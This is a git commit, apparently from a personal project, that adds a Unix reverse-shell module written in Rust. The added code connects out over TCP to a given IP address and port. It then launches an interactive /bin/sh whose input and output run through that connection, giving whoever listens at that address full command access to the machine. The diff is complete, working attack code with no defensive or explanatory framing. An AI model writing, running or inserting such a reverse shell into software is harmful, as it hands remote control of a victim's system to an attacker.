f2f013f526774f7902f1610fc001ad98e0c2f1b0
Kevin <kmancxc@gmail.com>
2021-12-13 19:29:53 -0800

    unix implementation of the reverse shell

---
+++ src/basic_tcp_reverse_shell/unix_rs/mod.rs
@@ -0,0 +1,25 @@
+use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+
+pub fn shell(ip: &str, port: u16) {
+    let ip_port = format!("{}:{}", ip, port);
+    //let ip_port = [ip, port].join(":");
+
+    // Make a TCP stream connection
+    let stream = TcpStream::connect(ip_port).unwrap();
+
+    // Use the stream as a file descriptor for sending stdin/stdout/stderr
+    let fd = stream.as_raw_fd();
+
+    // Open shell and set the file descriptor for stdin/stdout/stderr to the stream's file descriptor
+    Command::new("/bin/sh")
+        .arg("-i")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()
+        .unwrap()
+        .wait()
+        .unwrap();
+}
